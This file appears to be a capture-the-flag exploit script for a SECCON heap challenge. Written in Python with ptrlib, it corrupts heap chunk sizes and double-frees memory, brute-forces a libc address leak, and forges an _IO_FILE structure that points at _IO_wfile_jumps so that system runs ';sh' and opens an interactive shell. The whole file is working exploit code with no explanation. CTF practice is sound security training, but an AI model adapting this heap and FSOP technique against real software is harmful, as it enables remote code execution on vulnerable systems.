#!/usr/bin/env python3
from ptrlib import *

io = remote('free3.seccon.games', 8215)
libc = ELF('./libc.so.6')

ids = []
length = []

def alloc(size):
    io.sendlineafter("> ", 1)
    io.sendlineafter(": ", hex(size))
    io.recvuntil("ID:")
    id = int(io.recvuntil(" "), 16)
    ids.append(id)
    length.append(size)
    return id

def edit(id, data):
    io.sendlineafter("> ", 2)
    io.sendlineafter(": ", hex(id))
    chk = io.recv(3)
    if (chk == b"Not"):
        return -1
    io.recvuntil("(")
    length = io.recvuntil(")")[:-1]
    io.sendlineafter(": ", data)
    return int(length)

def free(id):
    io.sendlineafter("> ", 3)
    io.sendlineafter(": ", hex(id))
    idx = ids.index(id)
    ids.remove(id)
    length.pop(idx)
    return

def end():
    io.sendlineafter("> ", 0)
    return


alloc(0x70)
for i in range(2):
    alloc(0x2f0)
    free(ids[1])
alloc(0x2f0)
edit(ids[1], b"A" * 0x2e8 + p32(0x3f1))
alloc(0x3f0)
free(ids[1])
free(ids[1])

for i in range(7):
    for i in range(2):
        alloc(0x2f0)
        free(ids[1])
    alloc(0x200)
    edit(ids[1], b"A" * 0x1f8 + p32(0x3f1))
    alloc(0x3f0)
    free(ids[1])
    free(ids[1])

alloc(0x200)
free(ids[1])

libc_addr = 0
for i in range(0, 0x100):
    addr = edit(0x7f00 + i, b"K")
    if (addr != -1):
        libc_addr = ((0x7f00 + i) << 32) + addr
        break

libc.base = libc_addr - 0x203ed0
print("[+] libc addr is " + hex(libc.base))
    
edit(ids[0], b"A" * 0x20)
libc_id = libc.base >> 32

padd = p64(libc.base + 0x1b2800)
padd += p64(libc.base + 0x1b19c0)
padd += p64(libc.base + 0x1b1fc0)
padd += p64(libc.base + 0x1cca38) * 13
padd += p64(0) * 3
padd += p64(libc.base + 0x2044e0)
padd += p64(0) * 3

payload  = p32(0xfbad0101) + b";sh\0"
payload += p64(0) * 10
payload += p64(libc.symbol("system"))
payload += p64(0) * 5
payload += p64(libc.base + 0x205700)
payload += p64(0) * 2
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10)
payload += p64(0) * 3
payload += p32(1) + p32(0) + p64(0)
payload += p64(libc.symbol("_IO_2_1_stderr_") - 0x10)
payload += p64(libc.symbol('_IO_wfile_jumps') + 0x18 - 0x58)

edit(libc_id, b"A" * 0x538 + padd + payload)

end()
io.interactive()
